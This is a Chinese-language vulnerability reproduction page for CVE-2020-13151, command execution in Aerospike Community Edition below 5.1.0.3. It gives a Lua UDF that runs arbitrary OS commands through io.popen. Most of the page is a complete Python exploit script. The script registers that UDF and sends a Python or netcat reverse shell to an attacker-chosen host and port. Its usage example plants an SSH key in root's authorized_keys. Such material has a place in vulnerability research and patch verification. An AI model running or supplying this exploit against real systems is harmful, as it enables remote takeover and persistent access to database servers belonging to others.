<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞</h1><h2>一、漏洞简介</h2><p>攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。</p><h2>二、漏洞影响</h2><p>Aerospike 社区版 &lt;5.1.0.3</p><h2>三、复现过程</h2><p>首先导入CVE-2020-13151.lua</p><p>function runCMD(rec, cmd)<br />    local outtext = ""<br />    local phandle = io.popen(cmd)<br />    io.input(phandle)<br />    local foo = io.lines()<br />    for f in foo do<br />        outtext = outtext .. f .. "\n"<br />    end<br />    return outtext<br />end</p><p>3.png</p><p>创建单记录测试数据集以进行以下操作：</p><p>4.png</p><p>然后在最终在我们连接的主机上执行命令：</p><p>5.png</p><h3>poc</h3><p>CVE-2020-13151</p><p>1.png</p><p>2.png</p><p>#!/usr/bin/env python3<br />import argparse<br />import random<br />import os, sys<br />from time import sleep<br />import string<br /><br /># requires aerospike package from pip<br />import aerospike<br /># if this isn't installing, make sure os dependencies are met<br /># sudo apt-get install python-dev<br /># sudo apt-get install libssl-dev<br /># sudo apt-get install python-pip<br /># sudo apt-get install zlib1g-dev<br /><br />PYTHONSHELL = &quot;&quot;&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{ip}&quot;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&amp;&quot;&quot;&quot;<br />NETCATSHELL = 'rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/ft&amp;'<br /><br />def _get_client(cfg):<br />    try:<br />        return aerospike.client({<br />            'hosts': [(cfg.ahost, cfg.aport)],<br />             'policies': {'timeout': 8000}}).connect()<br /><br />    except Exception as e:<br />        print(f"unable to access cluster @ {cfg.ahost}:{cfg.aport}\n{e.msg}")<br /><br />def _send(client, cfg, _cmd):<br />    try:<br />        print(client.apply((cfg.namespace, cfg.setname, cfg.dummystring ), 'poc', 'runCMD', [_cmd]))<br />    except Exception as e:<br />        print(f"[-] UDF execution returned {e.msg}")<br /><br />def _register_udf(client, cfg):<br />    try:<br />        client.udf_put(cfg.udfpath)<br />    except Exception as e:<br />        print(f&quot;[-] whoops, couldn't register the udf {cfg.udfpath}&quot;)<br />        raise e<br /><br />def _random_string(l):<br />    return ''.join([random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(l)])<br /><br />def _populate_table(client, cfg):<br />    ns = cfg.namespace<br />    setname = cfg.setname<br />    print(f"[+] writing to {ns}.{setname}")<br />    try:<br />        rec = cfg.dummystring<br />        client.put((ns, setname, rec), {'pk':cfg.dummystring})<br />        print(f"[+] wrote {rec}")<br />    except Exception as e:<br />        print(f"[-] unable to write record: {e.msg}")<br />        try:<br />            if e.msg.startswith('Invalid namespace'):<br />                print("Valid namespaces: ")<br />                for n in _info_parse("namespaces", client).split(";"):<br />                    print(n.strip())<br />        except:<br />            pass<br />        sys.exit(13)<br /><br />def _info_parse(k, client):<br />    try: <br />        return [i[1] for i in client.info_all(k).values() ][0]<br />    except Exception as e:<br />        print(f"error retrieving information: {e.msg}")<br />        return []<br /><br />def _is_vuln(_mj, _mi, _pt, _bd):<br />    fixed = [5,1,0,3]<br />    found = [_mj, _mi, _pt, _bd]<br /><br />    if fixed == found:<br />        return False<br /><br />    for ix, val in enumerate(found):<br />        if val &lt; fixed[ix]:<br />            return True<br />        elif val == fixed[ix]:<br />            pass<br />        else:<br />            return False<br /><br /><br />def _version_check(client):<br />    print("[+] aerospike build info: ", end="")<br />    try:<br />        _ver = _info_parse("build", client)<br />        print(_ver)<br />        mj, mi, pt, bd = [int(i) for i in _ver.split('.')]<br />        if _is_vuln(mj, mi, pt, bd):<br />            print("[+] looks vulnerable")<br />            return<br />        else:<br />            print(f"[-] this instance is patched.")<br />            sys.exit(0)<br /><br />    except Exception as e:<br />        print(f"[+] unable to interpret build number due to {e}")<br />        print("[+] continuing anyway... ")<br /><br />def _exploit(cfg):<br />    client = _get_client(cfg)<br />    <br />    if not client:<br />        return<br /><br />    _version_check(client)<br /><br />    print(f"[+] populating dummy table.")<br />    _populate_table(client, cfg)<br /><br />    print(f"[+] registering udf")<br />    <br />    _register_udf(client, cfg)<br /><br />    if cfg.pythonshell or cfg.netcatshell:<br />        sys.stdout.flush()<br />        print(f"[+] sending payload, make sure you have a listener on {cfg.lhost}:{cfg.lport}", end="")<br />        sys.stdout.flush()<br />        for i in range(4): <br />            print(".", end="")<br />            sys.stdout.flush()<br />            sleep(1)<br /><br />        print(".")<br />        _send(client, cfg, PYTHONSHELL.format(ip=cfg.lhost,port=cfg.lport) if cfg.pythonshell else NETCATSHELL.format(ip=cfg.lhost,port=cfg.lport) )<br />    <br />    if cfg.cmd:<br />        print(f"[+] issuing command \"{cfg.cmd}\"")<br />        _send(client, cfg, cfg.cmd)<br /><br />if __name__ == '__main__':<br />    if len(sys.argv) == 1:<br />        print(f"[+] usage examples:\n{sys.argv[0]} --ahost 10.11.12.13 --pythonshell --lhost=10.0.0.1 --lport=8000")<br />        print("... or ... ")<br />        print(f&quot;{sys.argv[0]} --ahost 10.11.12.13 --cmd 'echo MYPUBKEY &gt; /root/.ssh/authorized_keys'&quot;)<br />        sys.exit(0)<br /><br />    parser = argparse.ArgumentParser(description='Aerospike UDF Command Execution - CVE-2020-13151 - POC')<br />    <br />    parser.add_argument("--ahost", help="Aerospike host, default 127.0.0.1", default="127.0.0.1")<br />    parser.add_argument("--aport", help="Aerospike port, default 3000", default=3000, type=int)<br />    parser.add_argument("--namespace", help="Namespace in which to create the record set", default="test")<br />    parser.add_argument("--setname", help="Name of set to populate with dummy record(s), default is cve202013151", default=None)<br />    parser.add_argument('--dummystring', help=&quot;leave blank for a random value, can use a previously written key to target a specific cluster node&quot;, default=None)<br />    parser.add_argument("--pythonshell", help="attempt to use a python reverse shell (requires lhost and lport)", action="store_true")<br />    parser.add_argument("--netcatshell", help="attempt to use a netcat reverse shell (requires lhost and lport)", action="store_true")<br />    parser.add_argument("--lhost", help="host to use for reverse shell callback")<br />    parser.add_argument("--lport", help="port to use for reverse shell callback")<br />    parser.add_argument("--cmd", help="custom command to issue against the underlying host")<br />    parser.add_argument('--udfpath', help=&quot;where is the udf to distribute? defaults to `pwd`/poc.lua&quot;, default=None)<br /><br />    cfg = parser.parse_args()<br />    if not cfg.setname:<br />        cfg.setname = 'cve202013151'<br />    if not cfg.dummystring:<br />        cfg.dummystring = _random_string(16)<br />    if not cfg.udfpath:<br />        cfg.udfpath = os.path.join(os.getcwd(), 'poc.lua')<br /><br />    assert cfg.cmd or (cfg.lhost and cfg.lport and (cfg.pythonshell or cfg.netcatshell)), "Must specify a command, or a reverse shell + lhost + lport"<br />    if cfg.pythonshell or cfg.netcatshell:<br />        assert cfg.lhost and cfg.lport, "Must specify lhost and lport if using a reverse shell"<br /><br />    _exploit(cfg)</p></body></html>